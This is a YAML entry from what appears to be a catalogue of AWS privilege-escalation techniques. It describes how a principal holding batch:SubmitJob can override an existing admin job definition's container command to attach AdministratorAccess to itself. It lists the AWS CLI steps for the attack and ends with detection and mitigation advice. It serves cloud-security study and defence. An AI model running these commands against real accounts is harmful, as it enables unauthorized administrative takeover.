id: batch-002
name: batch:SubmitJob
category: existing-passrole
services:
  - iam
  - batch

permissions:
  required:
    - permission: batch:SubmitJob
      resourceConstraints: No resource constraints required; must be able to submit to the target job queue
  additional:
    - permission: batch:DescribeJobDefinitions
      resourceConstraints: Helpful for discovering job definitions that carry privileged jobRoleArns
    - permission: batch:DescribeJobQueues
      resourceConstraints: Helpful for discovering available job queues
    - permission: batch:DescribeJobs
      resourceConstraints: Useful for polling job execution status
    - permission: batch:DescribeComputeEnvironments
      resourceConstraints: Helpful for understanding the compute environment configuration

description: A principal with only `batch:SubmitJob` can escalate privileges by submitting a job to an existing Batch job queue using a pre-existing job definition that already has an admin `jobRoleArn`. The `ContainerOverrides.Command` field allows the submitter to replace the container's default command with any arbitrary command — including `iam:AttachUserPolicy` — which executes using the job definition's admin role credentials. No `iam:PassRole` or `batch:RegisterJobDefinition` is required because the privileged role was already assigned to the existing job definition.

prerequisites:
  admin:
    - An existing Batch job definition must have an IAM role set as the jobRoleArn
    - The jobRoleArn role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
    - An existing Batch job queue must be available to submit jobs to
  lateral:
    - An existing Batch job definition must have an IAM role set as the jobRoleArn
    - An existing Batch job queue must be available to submit jobs to

exploitationSteps:
  awscli:
    - step: 1
      command: |
        aws batch describe-job-definitions \
          --status ACTIVE \
          --query 'jobDefinitions[*].{name:jobDefinitionName,role:containerProperties.jobRoleArn}' \
          --output table
      description: Enumerate existing active Batch job definitions to identify ones with privileged jobRoleArns attached.
    - step: 2
      command: |
        aws batch submit-job \
          --job-name privesc-override-job \
          --job-queue JOB_QUEUE_NAME \
          --job-definition PRIVILEGED_JOB_DEFINITION \
          --container-overrides '{
            "command": [
              "iam", "attach-user-policy",
              "--user-name", "STARTING_USER",
              "--policy-arn", "arn:aws:iam::aws:policy/AdministratorAccess"
            ]
          }'
      description: Submit a job using the existing privileged job definition, overriding the container command via ContainerOverrides.Command to attach AdministratorAccess to the starting user. The container runs with the job definition's admin role credentials.
    - step: 3
      command: |
        aws batch describe-jobs \
          --jobs JOB_ID \
          --query 'jobs[0].status' \
          --output text
      description: Poll job status until it reaches SUCCEEDED, indicating the privilege escalation command has executed.
    - step: 4
      command: |
        aws iam list-attached-user-policies \
          --user-name STARTING_USER
      description: Verify that AdministratorAccess is now attached to the starting user.

recommendation: |
  - **Restrict `batch:SubmitJob`** - This is the core attack permission. Only trusted principals that have a legitimate need to trigger Batch workloads should have this permission. Even without `iam:PassRole`, job submission is a powerful action when privileged job definitions exist.
  - **Audit existing job definitions for privileged roles** - Regularly review all active Batch job definitions and remove or down-scope any that carry administrative jobRoleArns. A job definition with an admin role is a persistent escalation vector for anyone with `batch:SubmitJob`.
  - **Use `batch:SubmitJob` conditions** - Restrict which job queues and job definitions a principal can submit to using IAM resource conditions on the `batch:SubmitJob` permission.
  - Monitor CloudTrail for Batch job submissions where the `ContainerOverrides` field modifies the container command, especially by principals who don't normally submit jobs
  - Monitor CloudTrail for Batch job submissions using job definitions with privileged roles
  - Alert on IAM policy attachment events (`iam:AttachUserPolicy`, `iam:AttachRolePolicy`) originating from Batch job execution roles
  - Regularly audit Batch job definitions for excessive IAM permissions on the `jobRoleArn`

